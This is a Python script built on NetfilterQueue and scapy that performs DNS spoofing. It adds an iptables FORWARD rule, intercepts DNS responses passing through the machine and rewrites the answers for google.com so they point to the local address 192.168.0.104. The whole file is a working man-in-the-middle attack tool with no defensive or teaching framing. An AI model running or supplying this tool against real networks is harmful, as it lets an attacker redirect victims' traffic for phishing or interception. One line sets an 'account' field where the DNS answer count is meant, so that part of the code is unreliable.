import logging as log
import os

from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP


class DNS_SPOOF:
    def __init__(self, host_dict, queue_num):
        self.host_dict = host_dict
        self.queue_num = queue_num
        self.queue = NetfilterQueue()

    def __call__(self):
        log.info("Spoofing...")
        os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}")
        self.queue.bind(self.queue_num, self.call_back)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(
                f"sudo iptables -D FORWARD -j NFQUEUE --queue-num {self.queue_num}"
            )
            log.info("[!} iptable rule flushed")

    def call_back(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            try:
                query_name = scapy_packet[DNSQR].qname
                print(query_name)
                if query_name in self.host_dict:
                    log.info(f"[original] {scapy_packet[DNSRR].summary()}")
                    scapy_packet[DNS].an = DNSRR(
                        rrname=query_name, rdata=self.host_dict[query_name]
                    )
                    scapy_packet[DNS].account = 1

                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum

                    log.info(f"[modified] {scapy_packet[DNSRR].summary()}")
            except IndexError as error:
                log.error(error)
            packet.set_payload(bytes(scapy_packet))
        return packet.accept()


if __name__ == "__main__":
    try:
        host_dict = {
            b"www.google.com.": "192.168.0.104",
            b"google.com.": "192.168.0.104",
        }
        queue_num = 1
        log.basicConfig(format="%(asctime)s - %(message)s", level=log.INFO)
        spoof = DNS_SPOOF(host_dict, queue_num)
        spoof()
    except OSError as error:
        log.error(error)
